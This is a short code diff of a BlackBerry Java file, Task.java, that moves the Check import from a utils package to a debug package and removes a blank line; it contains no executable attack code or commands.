@@ -19,6 +19,7 @@ import blackberry.action.Action;
 import blackberry.action.SubAction;
 import blackberry.action.UninstallAction;
 import blackberry.config.Conf;
+import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.EvidenceCollector;
@@ -27,7 +28,7 @@ import blackberry.manager.ActionManager;
 import blackberry.manager.EventManager;
 import blackberry.manager.ModuleManager;
 import blackberry.utils.BlockingQueueTrigger;
-import blackberry.utils.Check;
+import blackberry.debug.Check;
 
 /**
  * The Class Task.
@@ -464,7 +465,6 @@ public final class Task implements Singleton {
 
         // http://supportforums.blackberry.com/t5/Java-Development/Programmatically-rebooting-the-device/m-p/42049?view=by_date_ascending
         CodeModuleManager.promptForResetIfRequired();
-
     }
 
     private boolean needToRestart;
